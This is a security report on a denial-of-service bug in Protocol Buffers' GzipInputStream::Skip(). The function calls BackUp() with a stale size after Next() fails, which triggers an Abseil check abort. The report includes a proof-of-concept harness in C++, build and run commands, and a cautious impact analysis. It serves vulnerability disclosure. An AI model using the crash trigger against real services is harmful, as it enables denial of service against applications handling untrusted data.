# Protocol Buffers `GzipInputStream::Skip()` CHECK failure

## Summary

`google::protobuf::io::GzipInputStream::Skip()` can call `BackUp()` with a stale output size after `Next()` has failed. With the included input and call sequence, `BackUp()` rejects the invalid count through an Abseil check and terminates the process. This is a reproducible denial-of-service condition for a process that reaches this API path with the triggering stream and operations.

The supplied PoC uses the `GzipInputStream` API directly. It does not parse a Protocol Buffers message, and the report does not establish that every gzip stream or every protobuf parsing call can trigger the failure.

## Details

In `src/google/protobuf/io/gzip_stream.cc`, `Skip()` initializes `size` once, then updates it through calls to `Next()`. If `Next()` returns `false`, `size` may retain the value from the previous successful call. The final condition does not check `ok` before using `size`:

```cpp
bool GzipInputStream::Skip(int count) {
  const void* data;
  int size = 0;
  bool ok = Next(&data, &size);
  while (ok && (size < count)) {
    count -= size;
    ok = Next(&data, &size);
  }
  if (size > count) {
    BackUp(size - count);
  }
  return ok;
}
```

`BackUp()` checks that the requested count does not exceed the number of bytes currently available to back up:

```cpp
void GzipInputStream::BackUp(int count) {
  ptrdiff_t max_backup = static_cast<char*>(output_position_) -
                         static_cast<char*>(output_buffer_);
  ABSL_CHECK_GE(count, 0) << "count must not be negative";
  ABSL_CHECK_LE(count, max_backup)
      << "count must be within bounds of output buffer";
  output_position_ = static_cast<char*>(output_position_) - count;
}
```

For the included fixture, `Skip()` reaches a failed `Next()` with a stale `size`; it then calls `BackUp()` with a count of four while `max_backup` is zero. The resulting `ABSL_CHECK_LE(count, max_backup)` failure calls `abort()`. The failure happens before `BackUp()` adjusts `output_position_`.

The no-check experiment is a separate control: `poc_nocheck.cc` adds another `Next()` call and is paired with a `gzip_stream.cc` copy whose bounds check is removed. That run returned normally and did not produce an ASan report. It demonstrates an invalid backup calculation, but this experiment does not establish a subsequent out-of-bounds memory read or write.

## Reproduction

The standalone `poc.cc` uses the first 420 bytes of `input.bin` as the compressed input. The original fuzz harness consumed four control bytes from the end of the 424-byte fixture; their resulting values are fixed in this reduced reproducer. It uses an automatic gzip/zlib format, a 102-byte output buffer, and repeatedly calls `Next()`, `BackUp()`, and `Skip()`:

```cpp
constexpr int kSkipAmount = 18;
constexpr int kBackupSelector = 121;
constexpr int kBufferSize = 102;
const size_t compressed_size = input.size() - 4;

google::protobuf::io::ArrayInputStream source(
    input.data(), static_cast<int>(compressed_size), 7);
google::protobuf::io::GzipInputStream inflater(
    &source, google::protobuf::io::GzipInputStream::AUTO, kBufferSize);

for (size_t i = 0; i < 256; ++i) {
  const void* chunk = nullptr;
  int chunk_size = 0;
  if (!inflater.Next(&chunk, &chunk_size)) break;
  if (chunk == nullptr || chunk_size <= 0) break;
  if ((kBackupSelector & 1) != 0 && (i % 2) == 0) {
    const int backed_up = kBackupSelector % (chunk_size + 1);
    inflater.BackUp(backed_up);
  }
  if (!inflater.Skip(kSkipAmount)) break;
}
```

Build against the ASan/UBSan-instrumented Protocol Buffers output. Before running the commands below, set the `OUT` environment variable to the build output directory containing `build/sanitizer/include` and `build/sanitizer/lib`.

```sh
cd poc/protobuf
bash build.sh
./poc input.bin
```

The expected result is an Abseil fatal check similar to:

```text
Check failed: count <= max_backup (4 vs. 0)
count must be within bounds of output buffer
```

The process aborts with status 134. This is a CHECK failure, not an ASan heap-buffer-overflow report.

## Security impact

The demonstrated impact is process termination when an application reaches the failing `GzipInputStream::Skip()` path with the triggering input and operations. This can cause denial of service in an application that processes attacker-controlled data through this path. The PoC does not show that ordinary protobuf parsing invokes this sequence, and the no-check experiment did not demonstrate an out-of-bounds memory access or code execution. The practical attackability therefore depends on the application's use of `GzipInputStream` and whether an attacker can control the data and operations that reach `Skip()`.

## git describe

The Protocol Buffers source checkout used for this reproduction reports:

```text
9067872
```

This is the output of `git describe --always` for that checkout.
